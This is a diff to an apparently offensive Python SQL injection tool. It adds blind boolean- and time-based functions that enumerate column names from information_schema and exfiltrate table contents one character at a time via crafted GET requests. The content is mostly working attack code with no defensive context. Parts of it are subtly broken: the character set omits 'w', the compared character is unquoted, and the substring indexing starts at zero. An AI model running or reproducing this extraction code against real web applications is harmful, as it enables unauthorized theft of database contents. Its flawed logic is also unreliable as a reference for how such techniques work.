@@ -58,6 +58,7 @@ def return_data(payload, table, column, colcount, keystring=generate_random_stri
 
 # return information in bound with limited/no response
 # TODO: MAKE BLIND CODE FOR USER
+# TODO: MAKE IT WORK AHAHAH
 def return_tables_blind(url, payload, tablenamelike,  mode='bool',dbcontext="mysql"):
     if(mode == 'bool'):
         i=1
@@ -98,10 +99,82 @@ def return_tables_blind(url, payload, tablenamelike,  mode='bool',dbcontext="mys
 
     
     return
-def return_columns_blind(payload, table, mode="bool", dbcontext="mysql"):
+def return_columns_blind(url, payload, table, mode="bool", dbcontext="mysql"):
+    if(mode == 'bool'):
+        i=1
+        while True:
+            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},1,0)-- -'''
+            response = requests.get(url+sqlpayload)
+            if response.status_code == 200:
+                i+=1
+            else:
+                break
+        columnname = ''
+        for j in range(i):
+            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},1,0)-- -'''
+                response = requests.get(url+sqlpayload)
+                if response.status_code == 200:
+                    columnname += s
+                    break
+        return columnname
+    if(mode == 'time'):
+        i=1
+        while True:
+            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},SLEEP(4),0)-- -'''
+            response = requests.get(url+sqlpayload)
+            if response.elapsed.total_seconds() > 3:
+                i+=1
+            else:
+                break
+        columnname = ''
+        for j in range(i):
+            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},SLEEP(4),0)-- -'''
+                response = requests.get(url+sqlpayload)
+                if response.elapsed.total_seconds() > 3:
+                    columnname += s
+                    break
+        return columnname
 
     return
-def return_data_blind(payload, table, column, mode="bool", dbcontext="mysql"):
+def return_data_blind(url, payload, table, column, mode="bool", dbcontext="mysql"):
+    if(mode == 'bool'):
+        i=1
+        while True:
+            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},1,0)-- -'''
+            response = requests.get(url+sqlpayload)
+            if response.status_code == 200:
+                i+=1
+            else:
+                break
+        data = ''
+        for j in range(i):
+            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},1,0)-- -'''
+                response = requests.get(url+sqlpayload)
+                if response.status_code == 200:
+                    data += s
+                    break
+        return data
+    if(mode == 'time'):
+        i=1
+        while True:
+            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},SLEEP(4),0)-- -'''
+            response = requests.get(url+sqlpayload)
+            if response.elapsed.total_seconds() > 3:
+                i+=1
+            else:
+                break
+        data = ''
+        for j in range(i):
+            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},SLEEP(4),0)-- -'''
+                response = requests.get(url+sqlpayload)
+                if response.elapsed.total_seconds() > 3:
+                    data += s
+                    break
+        return data
     return
 
 if __name__ == '__main__':
